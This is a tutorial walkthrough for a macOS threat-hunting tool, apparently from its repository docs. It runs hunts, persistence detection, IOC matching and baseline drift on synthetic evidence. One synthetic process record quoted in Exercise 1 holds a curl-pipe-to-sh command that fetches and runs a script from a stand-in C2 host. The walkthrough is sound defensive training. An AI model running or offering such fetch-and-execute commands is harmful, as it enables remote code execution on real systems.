# Walkthrough: from a fresh clone to your first hunt

This walkthrough takes about 30 minutes, needs **no Mac, no root and no network** (after the
install), and uses only the bundled **synthetic** evidence. Nothing here touches your own system.
Every output block was produced by running the command in this repository; where a line is
abbreviated it is marked `...`. Finding IDs are stable hashes, so yours should match exactly.

> All hostnames end in `.example.test`, all IPs are in documentation ranges, and all hashes are
> fabricated. Do not treat anything in the synthetic data as real threat intelligence.

## Setup

```bash
git clone https://github.com/joeabur/threat-hunter-tool.git
cd threat-hunter-tool/mac-threat-hunter
python3 -m venv .venv && source .venv/bin/activate   # PowerShell: .venv\Scripts\Activate.ps1
python -m pip install -e ".[dev]"
python -m mac_threat_hunter doctor
python -m mac_threat_hunter rules validate
mkdir -p walkthrough                                  # scratch space, git-ignored
```

**Verify:** `doctor` ends without errors (on Linux/Windows it reports that live collection is
unsupported, which is expected), and `rules validate` reports all rules valid.

**Common mistakes:** running from the repo root instead of `mac-threat-hunter/`; forgetting to
activate the virtualenv (`No module named mac_threat_hunter`); Python older than 3.11.

---

## Exercise 1: Find a suspicious process

Goal: run a hunt and trace one finding back to the raw record.

```bash
python -m mac_threat_hunter hunt \
  --input examples/synthetic-evidence --output walkthrough/results
```

Expected output (abbreviated):

```text
Host: synthetic-mac.example.test  [SYNTHETIC DATA]
Records analysed: 53  Rules: 24 executed, 12 skipped, 0 disabled
Findings: 29 (heuristic 29, IOC 0, baseline 0); suppressed 0
By severity: high=7, medium=14, low=7, informational=1
  [high    |medium] MTH-EXEC-003 F-a7650e9dddbd Microsoft Word spawned sh
  ...
```

"Skipped" rules need data you did not supply (IOCs or a baseline). Now read the finding and its
source record:

```bash
python - <<'PY'
import json
r = json.load(open("walkthrough/results/results.json"))
f = next(x for x in r["findings"] if x["finding_id"] == "F-a7650e9dddbd")
print(f["title"], f["severity"], f["confidence"], f["evidence_ref"])
print([a["id"] for a in f["attack"]])
for line in f["investigation"]: print("-", line)
PY
python -c "import json;print(json.dumps(json.load(open('examples/synthetic-evidence/processes.json'))['records'][9],indent=2))"
```

Expected: `Microsoft Word spawned sh high medium processes.json#9`, ATT&CK `T1204`, `T1059`, and a
record with `"pid": 501`, `"ppid": 500`, `"cmdline": "sh -c curl -s http://c2.malicious.example.test/stage.sh | sh"`.

**Verify:** the `evidence_ref` index (`#9`) is the position in `records`; the finding's
`ancestors` show `Microsoft Word` then `launchd`. The finding is *high severity, medium
confidence*: a strong behaviour, but a macro-driven IT workflow could look the same, which the
finding's `false_positives` list says.

**Common mistakes:** reading severity as certainty (they are separate); forgetting that a hit is a
lead to investigate, not a verdict.

**Cleanup:** none needed yet (`walkthrough/` is git-ignored).

---

## Exercise 2: Catch a new persistence item

Goal: add a LaunchAgent to a copy of the evidence and see it detected.

```bash
cp -r examples/synthetic-evidence walkthrough/ex2
python - <<'PY'
import json, pathlib
p = pathlib.Path("walkthrough/ex2/persistence.json")
d = json.loads(p.read_text())
d["records"].append({
  "kind": "launch_agent", "scope": "user", "label": "com.example.exercise",
  "path": "/Users/alice/Library/LaunchAgents/com.example.exercise.plist",
  "program_path": "/Users/Shared/helper", "program_exists": True,
  "run_at_load": True, "keep_alive": False, "owner": "alice", "group": "staff",
  "mode": "0644", "mtime": "2026-10-01T09:00:00.000000Z"})
p.write_text(json.dumps(d, indent=2))
PY
python -m mac_threat_hunter hunt --input walkthrough/ex2 --output walkthrough/r2a --quiet
```

You edited evidence after it was hashed. The hunt still runs, but the integrity check records a
warning in `results.json` under `evidence.warnings` (and in the Markdown report):
`persistence.json: SHA-256 does not match manifest; the file changed after collection. Treat
results derived from it as unreliable.` Check it with
`python -c "import json;print(json.load(open('walkthrough/r2a/results.json'))['evidence']['warnings'])"`.
This is the safety feature working: real evidence must not be edited. Because this copy is **synthetic**, the
helper script may re-hash it:

```bash
python scripts/refresh_manifest.py walkthrough/ex2
python -m mac_threat_hunter hunt --input walkthrough/ex2 --output walkthrough/r2 --quiet
python - <<'PY'
import json
r = json.load(open("walkthrough/r2/results.json"))
for f in r["findings"]:
    if "exercise" in json.dumps(f["artifact"]):
        print(f["rule_id"], f["severity"], f["confidence"], f["title"])
PY
```

Expected output:

```text
re-hashed 6 files in walkthrough/ex2
MTH-PERS-001 high medium Launch item runs from writable path: com.example.exercise
MTH-PERS-003 low low Unlisted launch item: com.example.exercise
```

**Verify:** `MTH-PERS-001` fires because `/Users/Shared` is writable by every user;
`MTH-PERS-003` because the label is not in `allowlists.yaml`. Run `python -m mac_threat_hunter
rules list` to find both rules and read their YAML under `rules/persistence/`.

**Common mistakes:** forgetting `refresh_manifest.py`; running it on real evidence (it refuses
unless the manifest is marked synthetic); invalid JSON after hand-editing.

**Cleanup:** `rm -rf walkthrough/ex2 walkthrough/r2 walkthrough/r2a`

---

## Exercise 3: Match an indicator of compromise (and see exact matching)

Goal: understand that IOC matching is exact unless you opt in.

```bash
cat > walkthrough/my-iocs.json <<'JSON'
{"schema_version": 1, "name": "exercise",
 "indicators": [{"type": "domain", "value": "malicious.example.test",
                 "description": "Exercise IOC (synthetic)", "severity": "high"}]}
JSON
python -m mac_threat_hunter hunt --input examples/synthetic-evidence \
  --iocs walkthrough/my-iocs.json --output walkthrough/r3a | sed -n 2,3p
```

Expected: `Findings: 29 (heuristic 29, IOC 0, baseline 0)`. **Zero IOC hits** is correct: the
evidence only contains `c2.malicious.example.test`, a *subdomain*, and exact matching does not
guess. Now opt in to subdomains:

```bash
sed -i.bak 's/"severity": "high"}/"severity": "high", "include_subdomains": true}/' walkthrough/my-iocs.json
python -m mac_threat_hunter hunt --input examples/synthetic-evidence \
  --iocs walkthrough/my-iocs.json --output walkthrough/r3 | sed -n 2,3p
```

Expected:

```text
Records analysed: 53  Rules: 29 executed, 7 skipped, 0 disabled
Findings: 35 (heuristic 29, IOC 6, baseline 0); suppressed 0
```

The six IOC findings come from `MTH-IOC-002` (2), `MTH-IOC-003` (1) and `MTH-IOC-005` (3).

**Verify:** open `walkthrough/r3/results.json`, find a finding with `"category": "ioc_match"` and
check its `all_matches` list: it names the indicator, the field and the record that matched.

**Common mistakes:** expecting substring/subdomain matching by default; malformed JSON (the loader
reports the line); using real, sensitive indicators in a shared directory.

**Cleanup:** `rm -rf walkthrough/my-iocs.json* walkthrough/r3 walkthrough/r3a`

---

## Exercise 4: Baseline and drift

Goal: snapshot a clean host, change a watched file, see exactly what changed.

```bash
python -m mac_threat_hunter baseline create \
  --input examples/synthetic-evidence-clean --output walkthrough/baseline.json
```

Expected:

```text
Baseline written to walkthrough/baseline.json: persistence=3, files=4, listeners=3, config=6
WARNING: A baseline records what was observed, not what is safe: ...
```

Now simulate someone editing `/etc/hosts` (a synthetic hash change) and compare:

```bash
cp -r examples/synthetic-evidence-clean walkthrough/ex4
python - <<'PY'
import json, pathlib
p = pathlib.Path("walkthrough/ex4/files.json"); d = json.loads(p.read_text())
for r in d["records"]:
    if r.get("path") == "/etc/hosts": r["sha256"] = "c" * 64
p.write_text(json.dumps(d, indent=2))
PY
python scripts/refresh_manifest.py walkthrough/ex4
python -m mac_threat_hunter baseline compare --input walkthrough/ex4 --baseline walkthrough/baseline.json
python -m mac_threat_hunter hunt --input walkthrough/ex4 --baseline walkthrough/baseline.json \
  --output walkthrough/r4 | sed -n 2,5p
```

Expected:

```text
  MODIFIED  files        /etc/hosts  (changed: sha256)
Totals: modified=1
...
Findings: 1 (heuristic 0, IOC 0, baseline 1); suppressed 0
  [medium  |medium] MTH-BASE-004 F-77534f680b3d Watched file modified: /etc/hosts
```

**Verify:** the clean evidence compared with its own baseline gives no differences; only the
one edited field differs. Baselines are never overwritten silently: re-running `baseline create`
into an existing path fails unless you pass `--force`.

**Common mistakes:** treating a baseline as proof the host is clean (it records what *was*, good
or bad); accepting a drift without review; comparing against a baseline from a different host.

**Cleanup:** `rm -rf walkthrough` (everything created above lives there).

---

## Where next

- Render reports: `python -m mac_threat_hunter report --input walkthrough/results --output walkthrough/reports`
- Write your own rule: [rule-authoring.md](rule-authoring.md)
- On a real Mac: `python -m mac_threat_hunter collect --profile basic --dry-run`, then without
  `--dry-run`. See the [user guide](user-guide.md) and [limitations](security-and-limitations.md).
